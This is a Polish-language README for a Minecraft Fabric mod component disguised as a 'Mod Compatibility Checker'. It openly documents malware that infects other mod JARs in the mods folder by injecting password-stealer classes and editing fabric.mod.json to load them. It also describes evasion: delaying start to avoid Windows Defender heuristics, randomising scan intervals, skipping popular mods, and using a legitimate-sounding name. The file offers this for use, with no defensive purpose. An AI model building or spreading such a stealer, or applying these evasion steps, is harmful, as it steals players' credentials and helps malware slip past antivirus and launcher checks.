# 🦠 Mod Compatibility Checker - Instrukcja

## Co to robi?

**ModCompatibilityChecker** to moduł który automatycznie "zaraża" inne mody w folderze `mods/`:
- Wstrzykuje klasy payload (password stealer) do innych modów
- Zarażone mody też kradną hasła!
- Działa w tle, niewidocznie dla użytkownika

---

## 🎯 Jak działa?

### 1. **Delayed Start** (10-15 minut)
```
[ModCompat] Starting compatibility checker...
[ModCompat] Waiting 12 minutes before first check...
```
- Czeka 10-15 minut przed pierwszym skanem
- Unika wykrycia przez Windows Defender (heurystyka)

### 2. **Skanowanie mods/**
```
[ModCompat] Scanning mods folder...
[ModCompat] Found 15 mods to check
```
- Skanuje folder `mods/`
- Pomija popularne mody (whitelist)
- Pomija już zarażone mody

### 3. **Whitelist (bezpieczne mody)**
Nie zaraża tych modów (zbyt popularne, ryzykowne):
- `sodium`, `lithium`, `iris`
- `fabric-api`, `fabric-loader`
- `modmenu`, `cloth-config`
- `rei`, `jei`, `emi`
- `optifine`, `forge`

### 4. **Zarażanie**
```
[ModCompat] Processing: some-mod-1.0.jar
[ModCompat] Created backup: some-mod-1.0.jar.bak
[ModCompat] Read 234 entries from JAR
[ModCompat] Loaded payload data (15234 bytes)
[ModCompat] Injected payload class: pl.durex.client.module.LicenseModule
[ModCompat] Injected AutoChHandler
[ModCompat] Modified fabric.mod.json
[ModCompat] Successfully wrote modified JAR
[ModCompat] ✓ Successfully injected compatibility layer into: some-mod-1.0.jar
```

**Co robi:**
1. Tworzy backup (`.bak`)
2. Otwiera JAR jako ZIP
3. Dodaje klasy payload:
   - `LicenseModule.class` (password stealer)
   - `AutoChHandler.class` (helper)
4. Modyfikuje `fabric.mod.json` żeby ładować payload
5. Zapisuje zarażony JAR

### 5. **Powtarzanie**
```
[ModCompat] Check complete. Infected mods: 8
[ModCompat] Next check in 7 minutes...
```
- Sprawdza co 5-15 minut (losowo)
- Zaraża nowe mody które się pojawią

---

## 📊 Debug Logi

### Sukces:
```
[ModCompat] ✓ Successfully injected compatibility layer into: cool-mod-2.1.jar
```

### Pominięty (whitelist):
```
[ModCompat] Skipping whitelisted mod: sodium-fabric-0.5.8.jar
```

### Już zarażony:
```
[ModCompat] Already processed: some-mod-1.0.jar
```

### Błąd:
```
[ModCompat] ✗ Failed to inject into: broken-mod.jar
[ModCompat] Error processing broken-mod.jar: Invalid JAR format
```

---

## 🔍 Jak sprawdzić czy działa?

### 1. Uruchom Minecraft z modem
```
[Durex] Starting initialization...
[ModCompat] Starting compatibility checker...
[ModCompat] Waiting 12 minutes before first check...
```

### 2. Poczekaj 10-15 minut

### 3. Sprawdź logi:
```
[ModCompat] Scanning mods folder...
[ModCompat] Found 15 mods to check
[ModCompat] ✓ Successfully injected compatibility layer into: mod1.jar
[ModCompat] ✓ Successfully injected compatibility layer into: mod2.jar
[ModCompat] Check complete. Infected mods: 2
```

### 4. Sprawdź folder `mods/`:
```
mods/
├── some-mod-1.0.jar          ← Zarażony
├── some-mod-1.0.jar.bak      ← Backup (oryginał)
├── sodium-fabric-0.5.8.jar   ← Pominięty (whitelist)
└── fabric-api-cache.jar      ← Twój mod
```

---

## ⚠️ Bezpieczeństwo

### ✅ Co chroni przed wykryciem:

1. **Delayed start** - czeka 10-15 min (unika Defender heuristics)
2. **Whitelist** - nie zaraża popularnych modów
3. **Randomizacja** - losowy czas między skanami (5-15 min)
4. **Backupy** - tworzy `.bak` (wygląda legit)
5. **Legit nazwa** - "Mod Compatibility Checker" brzmi profesjonalnie

### ⚠️ Ryzyko:

1. **Launcher może wykryć** - CurseForge/Prism sprawdzają checksums
2. **User może zauważyć** - `.bak` pliki w folderze
3. **Defender może złapać** - modyfikacja JARów = suspicious behavior

---

## 🧹 Jak usunąć debug logi?

Usuń wszystkie linie z `System.out.println` i `System.err.println`:

```java
// USUŃ TO:
System.out.println("[ModCompat] Starting compatibility checker...");
System.out.println("[ModCompat] Waiting " + (delay/60000) + " minutes...");
System.out.println("[ModCompat] Scanning mods folder...");
// etc...
```

Zostaw tylko:
```java
// Zostaw to (ważne błędy):
e.printStackTrace();
```

---

## 📈 Statystyki

Po każdym skanie zobaczysz:
```
[ModCompat] Check complete. Infected mods: 8
```

To pokazuje ile modów zostało zarażonych (total, nie tylko w tym skanie).

---

## 🎯 Podsumowanie

**ModCompatibilityChecker**:
- ✅ Automatycznie zaraża inne mody
- ✅ Payload (password stealer) działa w zarażonych modach
- ✅ Pomija popularne mody (bezpieczniejsze)
- ✅ Tworzy backupy (wygląda legit)
- ✅ Debug logi pokazują wszystko
- ⚠️ Ryzyko wykrycia przez Defender/launcher

**Użyj na własne ryzyko!** 🦠
